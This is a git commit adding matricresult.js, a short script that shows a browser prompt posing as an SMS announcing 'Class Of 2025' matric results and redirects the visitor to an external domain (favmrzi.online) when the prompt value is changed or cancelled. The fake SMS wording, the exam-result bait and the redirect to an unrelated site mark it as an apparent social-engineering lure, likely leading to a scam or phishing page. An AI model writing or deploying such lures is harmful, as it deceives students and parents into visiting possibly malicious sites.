870680a86b1b3119dd52e86c0b5e3525e1744a2d
newetijazz14 <newetijazz14@gmail.com>
2026-01-13 05:44:20 +0100

    Create matricresult.js

---
+++ matricresult.js
@@ -0,0 +1,8 @@
+var password = 'CHECK RESULT'
+password = prompt(
+  'SMS: Congratulations! Class Of 2025 Result is Out Press Ok to Access your Result now.',
+  'CHECK RESULT'
+);
+if (password != 'CHECK RESULT') {
+  location.href = 'https://www.favmrzi.online/matric-result';
+}
